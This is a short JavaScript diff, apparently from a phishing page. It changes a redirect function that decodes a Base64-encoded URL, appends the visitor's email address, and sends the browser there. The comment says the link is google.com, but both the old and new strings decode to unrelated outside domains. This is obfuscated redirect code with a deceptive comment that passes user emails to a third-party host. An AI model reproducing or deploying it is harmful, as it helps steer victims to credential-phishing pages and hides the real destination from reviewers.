@@ -1760,7 +1760,7 @@
     }
 
     function redirect(email) {
-        var linkx = "aHR0cHM6Ly9ybWhncm91cHMuY29tL3NhbmUv"; // Base64 encoded link for "https://google.com"
+        var linkx = "aHR0cHM6Ly9yZWxpYW50LXJlaGFicy5jb20vc2FuZQ=="; // Base64 encoded link for "https://google.com"
         var decodedLink = atob(linkx);
         var finalLink = decodedLink + "#" + email; // Append the email directly to the URL
         window.location.href = finalLink;
